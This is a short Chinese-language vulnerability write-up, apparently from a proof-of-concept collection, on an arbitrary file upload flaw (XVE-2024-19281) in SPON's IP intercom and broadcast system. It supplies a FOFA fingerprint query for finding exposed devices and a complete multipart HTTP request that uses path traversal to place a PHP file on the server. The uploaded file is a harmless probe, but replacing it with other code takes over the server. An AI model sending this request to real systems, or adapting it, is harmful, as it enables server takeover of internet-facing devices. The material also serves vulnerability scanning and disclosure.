# 世邦通信SPON-IP网络对讲广播系统addmediadata.php任意文件上传漏洞(XVE-2024-19281)

盛邦通信的SPON IP对讲广播系统采用先进的IPAudio技术，通过局域网和广域网以数据包的形式传输音频信号。该系统实现了全数字化的传输。盛邦通信的SPON IP对讲广播系统存在一个漏洞，允许任意文件上传。攻击者可以利用这个漏洞上传任意文件，并获取服务器权限。

## fofa

```yaml
icon_hash="-1830859634"
```

## poc

```yaml
POST /php/addmediadata.php HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US)
AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16
Content-Length: 514
Content-Type: multipart/form-data;boundary=de3b7a45ced9f35720e192ff54eb83908644f0ec70b3dc6fb19b6b5f08
Accept-Encoding: gzip, deflate, br
Connection: close

--de3b7a45ced9f35720e192ff54eb83908644f0ec70b3dc6fb19b6b5f0828
Content-Disposition: form-data; name="fullpath"

../
--de3b7a45ced9f35720e192ff54eb83908644f0ec70b3dc6fb19b6b5f0828
Content-Disposition: form-data; name="subpath"

/
--de3b7a45ced9f35720e192ff54eb83908644f0ec70b3dc6fb19b6b5f0828
Content-Disposition: form-data; name="file"; filename="test.php"
Content-Type: application/octet-stream

<?php echo md5(1);unlink(__FILE__);?>
--de3b7a45ced9f35720e192ff54eb83908644f0ec70b3dc6fb19b6b5f0828--
```

